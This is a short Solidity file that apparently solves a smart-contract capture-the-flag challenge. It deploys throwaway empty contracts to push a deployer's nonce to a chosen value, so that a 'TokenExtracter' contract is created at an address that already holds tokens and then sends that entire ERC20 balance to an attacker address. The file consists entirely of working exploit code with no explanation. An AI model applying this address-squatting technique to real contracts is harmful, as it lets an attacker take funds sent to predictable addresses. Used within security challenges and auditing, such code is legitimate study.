// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EmptyContract{
    //Do nothing, just used to increase nonce
    constructor(){}
}

contract SafeMinersExploit{
    constructor(address _attacker, address _token, uint nonceToReach){        
        for(uint i = 0; i < nonceToReach - 1; i++){
            new EmptyContract();
        }
        //Once I'm at the proper nonce, deploy the TokenExtracter
        new TokenExtracter(_attacker, _token);
    }
}


contract TokenExtracter{
    constructor(address _attacker, address _token){
        if(IERC20(_token).balanceOf(address(this)) > 0){
            IERC20(_token).transfer(_attacker, IERC20(_token).balanceOf(address(this)));
        }
    }
}